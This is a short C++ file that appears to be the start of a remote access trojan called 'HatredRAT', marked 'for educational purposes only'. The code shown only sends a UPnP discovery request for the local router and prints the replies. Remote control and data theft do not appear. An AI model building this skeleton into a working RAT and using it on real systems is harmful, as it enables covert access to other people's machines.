// for educational purposes only

#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <poll.h>

#include "./util.h"
#include "./upnp.h"
#include "./net.h"

#define IPV4_ADDR_STR_LEN 16

#define PROTO_INET 0

using namespace hatred;

int main() {
    DPRINTF("HatredRAT version 1.\n"
            "FOR EDUCATIONAL PURPOSES ONLY.\n");

    DPRINTF("attempting to start server\n");

    DPRINTF("try upnp\n");

    int upnpsock = socket(AF_INET, SOCK_DGRAM, PROTO_INET);
    
//    char msg[strlen(msearch_template) + 1];
    upnp::send_msearch_m(upnpsock, {
        .max_wait = 1,
        .search_target = "urn:schemas-upnp-org:device:InternetGatewayDevice:1"
    });

//    sprintf(msg, msearch_template, 2);
//    DPRINTF("=== upnp send message\n%s\n===\n", msg);
//    sendto(upnpsock, msg, strlen(msg), 0, (sockaddr*)&upnpaddr, sizeof(upnpaddr));
    
    char resp[1024];
    while (net::readto(upnpsock, resp, sizeof(resp), 100) > 0) {
        DPRINTF("=== upnp recv message\n%s\n===\n", resp);
        memset(resp, 0, sizeof(resp));
    }

    return 0;
}